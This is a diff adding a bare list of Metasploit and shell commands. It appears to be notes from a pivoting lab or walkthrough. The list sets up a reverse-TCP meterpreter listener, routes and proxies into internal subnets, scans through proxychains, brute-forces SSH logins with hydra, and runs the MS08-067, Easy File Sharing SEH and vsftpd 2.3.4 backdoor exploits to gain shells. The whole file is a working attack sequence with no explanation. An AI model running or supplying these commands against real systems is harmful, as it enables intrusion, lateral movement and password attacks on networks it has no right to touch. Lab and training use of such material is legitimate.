@@ -1,0 +1,49 @@
+use exploit/multi/handler 
+set payload windows/meterpreter/reverse_tcp
+set LHOST 172.16.0.20 
+set LPORT 1234
+run
+ifconfig
+run autoroute -s 7.7.7.0/24
+run autoroute -p
+run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24
+background 
+use auxiliary/server/socks4a 
+show options
+set srvhost 172.16.0.20
+run
+socks4  172.16.0.20 1080
+proxychains nmap -sT -sV -Pn -n -p22,80,135,139,445 --script=smb-vuln-ms08-067.nse 7.7.7.20
+portfwd -h
+portfwd add -L 172.16.0.20 -l 2323 -p 80 -r 7.7.7.20
+portfwd list
+use auxiliary/scanner/ssh/ssh_enumusers 
+set rhosts 7.7.7.20
+set rport 22
+set user_file /usr/share/wordlists/metasploit/default_users_for_services_unhash.txt
+run
+proxychains hydra 7.7.7.20 ssh -s 22 -L /tmp/user.txt -P top100.txt -t 4
+proxychains ssh admin@7.7.7.20
+use exploit/windows/smb/ms08_067_netapi 
+show options 
+set rhost 7.7.7.20
+set payload windows/meterpreter/bind_tcp
+show options 
+run
+use exploit/windows/http/easyfilesharing_seh 
+set rhost 7.7.7.20
+set payload windows/meterpreter/bind_tcp
+run
+ipconfig
+run post/windows/gather/arp_scanner RHOSTS=8.8.8.0/24
+run autoroute -s 8.8.8.0/24
+use auxiliary/server/socks4a
+show options
+set SRVPORT 1081
+run
+cat /etc/proxychains.conf | grep -v "#"
+proxychains nmap -sT -sV -p21,22,23,80 8.8.8.9 -n -Pn -vv
+use exploit/unix/ftp/vsftpd_234_backdoor
+show options
+set rhost 8.8.8.9
+run
